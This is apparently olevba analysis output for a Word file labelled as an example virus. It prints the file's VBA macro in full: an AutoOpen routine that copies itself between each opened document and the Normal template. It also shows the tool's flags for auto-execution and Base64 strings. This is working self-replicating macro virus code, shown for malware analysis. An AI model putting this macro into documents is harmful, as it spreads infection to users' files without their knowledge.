olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Example
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Example - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO ExampleVirus.bas 
in file: ./Virus.MSWord.Example - OLE stream: 'Macros/VBA/ExampleVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'1st line: if the active document's name is Normal then
'2nd line: copy the macro ExampleVirus from the active document to the normal template; the macro is a project item
'3rd line: but if the name of the active document ain't normal.dot then
'4th line: copy the macro ExampleVirus from the notmal template to the active document; the macro is a project item
If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "ExampleVirus", wdOrganizerObjectProjectItems
Else
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "ExampleVirus", wdOrganizerObjectProjectItems
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

